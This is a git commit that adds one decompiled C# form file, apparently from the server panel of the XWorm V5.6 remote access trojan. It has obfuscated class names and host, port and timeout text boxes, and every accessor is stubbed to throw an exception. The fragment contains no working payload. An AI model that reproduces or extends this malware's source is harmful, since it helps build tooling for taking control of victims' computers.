90caf0cba9a67407c8ba69ad0601ba79a0702d71
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:44 +0400

    Forms61.cs

---
+++ XWorm V5.6/Server/Forms/Forms61.cs
@@ -0,0 +1,70 @@
+﻿using Guna.UI2.WinForms;
+using Microsoft.VisualBasic.CompilerServices;
+using System;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+
+namespace V484C4C4C728C5A3354885V28B9C45E8
+{
+  [DesignerGenerated]
+  public class V0C8ACE7F1ECFE94VF3FVV48FFD95CV8 : Form
+  {
+    internal virtual Guna2GradientButton Guna2GradientButton1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ほ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("ぃ");
+    }
+
+    internal virtual Guna2TextBox Guna2TextBox1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぁ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("ぴ");
+    }
+
+    internal virtual Guna2TextBox Guna2TextBox2
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ポ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("さ");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2TextBox get_txtPort() => throw new Exception("ど");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_txtPort(Guna2TextBox WithEventsValue) => throw new Exception("む");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2TextBox get_txtHost() => throw new Exception("ろ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_txtHost(Guna2TextBox WithEventsValue) => throw new Exception("す");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2GroupBox get_Guna2GroupBox2() => throw new Exception("ざ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Guna2GroupBox2(Guna2GroupBox WithEventsValue) => throw new Exception("ぇ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2TextBox get_txtTimeout() => throw new Exception("ど");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_txtTimeout(Guna2TextBox WithEventsValue) => throw new Exception("ん");
+  }
+}
